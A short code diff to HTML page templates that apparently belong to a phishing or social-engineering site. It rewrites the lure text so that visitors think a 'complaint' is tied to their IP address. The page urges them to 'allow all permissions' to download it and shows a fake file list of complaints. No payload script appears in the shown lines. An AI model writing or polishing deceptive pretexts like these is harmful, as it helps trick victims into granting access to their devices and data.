@@ -407,7 +407,7 @@ PERMISSIONS_PAGE = """
             {% if error == 'denied' %}
             <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
             {% endif %}
-            <h2>To download the codes, you have to verify whether you are the right person who has the IP address</h2>
+            <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
             <p>Kindly allow all permissions by clicking enable.</p>
             <button id="enableButton" class="btn btn-primary">Enable</button>
             <p id="status"></p>
@@ -693,11 +693,11 @@ DRIVE_PAGE = """
         <p>Your complaints:</p>
         <div class="file-list">
             <div class="file">
-                <div>📄 codes #1</div>
+                <div>📄 Complaint #1</div>
                 <div>{{ date1 }}</div>
             </div>
             <div class="file">
-                <div>📄 codes #2</div>
+                <div>📄 Complaint #2</div>
                 <div>{{ date2 }}</div>
             </div>
         </div>
